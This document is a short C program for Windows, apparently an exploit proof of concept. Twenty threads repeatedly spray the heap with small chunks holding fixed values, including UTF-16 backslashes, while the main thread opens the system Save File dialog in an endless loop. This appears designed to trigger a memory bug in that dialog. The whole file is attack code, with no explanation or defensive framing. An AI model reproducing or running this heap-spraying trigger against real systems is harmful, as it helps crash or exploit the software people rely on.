#include <windows.h>
#include <stdio.h>
#include <time.h>

INT RangedRand(INT range_min, INT range_max)
{
	return range_min + rand() % (range_max - range_min);
}

DWORD WINAPI MyThreadFunction(LPVOID lpParam)
{
	PVOID apvAddresses[0x20000] = { 0 };

	for (;;)
	{
		for (SIZE_T nIndex = 0; nIndex < 0x20000; ++nIndex)
		{
			/* Heap spraying */
			apvAddresses[nIndex] = CoTaskMemAlloc(4);
			*(PDWORD)apvAddresses[nIndex] = 0x11111111;
			*(((PDWORD)apvAddresses[nIndex]) + 1) = 0x005c005c;
		}
		Sleep(100);
		for (SIZE_T nIndex = 0x20000; nIndex > 0; --nIndex)
		{
			if (NULL != apvAddresses[nIndex - 1])
			{
				CoTaskMemFree(apvAddresses[nIndex - 1]);
			}
			apvAddresses[nIndex - 1] = 0;
		}
	}
	return 0;
}

int PASCAL WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	OPENFILENAME ofn = { 0 };
	WCHAR path[MAX_PATH + 1] = { 0 };
	srand(time(NULL));
	int dwSleep = 0;
	HANDLE  hThreadArray[20];

	for (int i = 0; i < 20; i++)
	{
		Sleep(RangedRand(1, 300));

		/* Creates the heap spraying threads */
		hThreadArray[i] = CreateThread(NULL, 0,	MyThreadFunction, NULL, 0, NULL);
	}

	ofn.lStructSize = sizeof(ofn);
	ofn.hwndOwner = NULL;
	ofn.hInstance = NULL;
	ofn.lpstrFilter = L"";
	ofn.nFilterIndex = 1;
	ofn.lpstrFile = path;
	ofn.nMaxFile = sizeof(path) / sizeof(WCHAR);
	ofn.Flags = OFN_OVERWRITEPROMPT | OFN_HIDEREADONLY;
	ofn.lpstrDefExt = L"txt";

	while (TRUE)
	{
		Sleep(5000);
		GetSaveFileName(&ofn);
	}

	return 0;
}
